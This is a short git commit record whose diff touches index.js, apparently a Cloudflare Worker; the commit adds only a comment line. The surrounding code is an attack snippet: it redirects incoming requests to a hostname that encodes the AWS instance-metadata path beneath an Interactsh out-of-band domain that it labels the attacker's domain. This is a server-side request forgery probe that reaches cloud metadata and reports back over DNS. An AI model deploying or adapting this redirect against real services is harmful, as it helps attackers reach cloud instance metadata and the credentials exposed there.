eecaece28ad6aa9a854ecf6aa52459b1e9d67f19
Unknown_tht <65358061+shripad5258@users.noreply.github.com>
2025-03-06 01:10:32 +0530

    sone se pahile index.js

--- index.js
+++ index.js
@@ -1,6 +1,7 @@
 export default {
   async fetch(request) {
     // Step 1: Redirect to AWS metadata path encoded in the DNS subdomain
+    //lets try 
     const awsPath = "169-254-169-254-latest-meta-data-hostname"; // DNS-safe format
     const attackerDomain = "bjgibppjensgmxvguqwdo8l6ka1vo9c8n.oast.fun"; // Your Interactsh domain
     return Response.redirect(`http://${awsPath}.${attackerDomain}`, 302);
